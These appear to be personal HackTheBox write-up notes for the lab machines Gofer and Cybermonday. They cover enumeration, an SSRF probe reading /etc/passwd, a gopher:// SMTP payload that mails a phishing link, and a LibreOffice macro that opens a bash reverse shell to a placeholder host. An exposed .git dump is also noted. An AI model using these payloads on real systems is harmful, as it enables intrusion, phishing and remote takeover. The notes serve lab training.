## Gofer
[write-up](https://rouvin.gitbook.io/ibreakstuff/writeups/htb-season-2/gofer)
### Reco
- NMAP
    - `nmap -sVC 10.10.11.225`
        ![](https://hackmd.io/_uploads/SkEh6Mdi2.png)
        - 22 SSH
        - 25 filtered SMTP
        - 80 HTTP (redirect gofer.htb)
            - add it to our /etc/hosts
        - 139,445 SAMBA (smbd 4.6.2)
            - clock-skew -2s
            - security-mode 311 (signing enabled but not required)
- Website
    - "We are team of talented designers making websites with **BOOTSTRAP**"
        - BootstrapMade
    - images are stored in /assets/img/portfolio
    - contact form could have some weakness
        ![](https://hackmd.io/_uploads/B1wqpMdih.png)
### Weaponisation
- SMB
    - using nmap we found samba, lets scan it
        - `smbmap -H 10.10.11.225 -u " "`
            ![](https://hackmd.io/_uploads/r1R21Qdjn.png)
            - we have "read only" permissions to disk **SHARES**
    - let´s look inside shares disk
        - `smbclient -N //10.10.11.225/shares`
            ![](https://hackmd.io/_uploads/H1GPe7dsn.png)
    - analyze obtained backedup **email**
        - ![](https://hackmd.io/_uploads/HJCFlXusn.png)
            - email addresses: jdavis@gofer.htb, tbuckley@gofer.htb
            - they are sending important documents internally by mail
                - using .odt format (Libreoffice, not Office Word)
            - there is a proxy
- Dir scan
    - `dirsearch -u http://gofer.htb/`
        - we can access gofer.htb/assets
        ![](https://hackmd.io/_uploads/BJumDXOs2.png)
    - /assets
        - style.css, main.js
            - template Maxim v4.9.1
        - php-email-form/validate.js
            - PHP Email Form Validation v3.5
        ![](https://hackmd.io/_uploads/H1zvwm_oh.png)
- Proxy
    - let´s find the proxy
        - `ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u "http://gofer.htb" -H "Host: FUZZ.gofer.htb" -fw 20`
            - **proxy.gofer.htb** -> add it to /etc/hosts
                ![](https://hackmd.io/_uploads/H13NMXujn.png)
        
### Exploitation
- **SSRF**
    - when accessing proxy.gofer.htb, there is a login pop-up window
        - Lets try the POST request for the index.php 
            - `curl -X POST http://proxy.gofer.htb/index.php`
            ![](https://hackmd.io/_uploads/Sy35nT9sn.png)
                - passed without credentials, but nothing more...
        - there could be a SSRF vuln
            - URL parameter can be specified like this:
                - `curl -X POST http://proxy.gofer.htb/index.php?url=http://<LOCAL_IP>`
            - now we can try /passwd path
                - `curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd`
            - after a bit of testing and modifying...
                - `curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd`
- We need to use an .odt format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of jdavis, so we know the username naming convention). 
    - Since we have some kind of SSRF on the proxy service, we might be able to force a user to download and execute a malicious .odt file via macros to get the first shell. However, we first need to find out how to send an email through the proxy to the user since SMTP is not publicly facing. 
    - Based on the box name alone, I sort of figured out that we need to use the gopher:// protocol, which is used to send files to other users. 
- !!! **important knowledge**: [SSRF](https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2?gi=50c9cd56d751) and [Gopherus payload](https://github.com/tarunkant/Gopherus) !!!
- OK: we want to use the **gopher** protocol to craft an ssrf payload based on the information in the email found on smb
    - right path to a foothold is in the obtained email
        - we can use the mentioned Gopherus for creating payload:
- **1. PAYLOAD:** 
    - `curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ciamanidiot@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ciamanidiot@gofer.htb%3E%250d%250aTo%3A%20%3Cjdavis@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.24/macro.odt>open</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"`
        - [.odt file HINT](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
- **2. MACRO:**
    - prepare it by this [guide](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
                
> Sub Main
> Shell("bash -c 'bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'")
> End Sub

- **3. HTTP.SERVER && NC:**
    - `nc -nlvp <LOCAL_PORT>`
    - `python3 -m http.server 80` //in the folder containing macro.odt
### User flag
### Root flag
- Linpeas
    -  lim8en1 (option #8)
    -  23+who

# Cybermonday
## Reco
- `nmap -sVC 10.10.11.228`
    - add cybermonday.htb to /etc/hosts...
        - sudo nano /etc/hosts
- FUZZING
    - `wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 400,301 -H 'Host:cybermonday.htb/FUZZ' http://cybermonday.htb`
        - nothing found
    - `wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 400,301 -H 'Host:FUZZ.cybermonday.htb' http://cybermonday.htb`
        - nothing found
    - `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://cybermonday.htb -t 100`
        - nothing found
- Website debugging
    - while checkning the website, it automatically opens the debig interface (probably checking if I try to cause SQL errors)...
        - 2 ways to cause this:
            - re-login with an existing user
            - change the user information in the profile
    ![](https://hackmd.io/_uploads/rk4NbE7ah.png)
    - on the left, there is a mention about existing **GIT**
        ![](https://hackmd.io/_uploads/ByzuW4ma3.png)
        - `cybermonday.htb/assets../.git/`
    - download the git using `git-dumper`
        - looking at the source code, there is an except:
            - `["_token","password","password_confirmation"]`
                - all parameters passed are saved by `$user->update($data);` then it saves information to the DB
    - from source code or debug on website we can see that the user´s model information looks like this:
        - {
            "id": 4,
            "username": "tester",
            "email": "test@gmail.com",
            "isAdmin": "false",
            "created_at": "2023-08-22T10:17:23.0000000Z",
            "updated_at": "2023-08-22T10:17:23.0000000Z",
        }



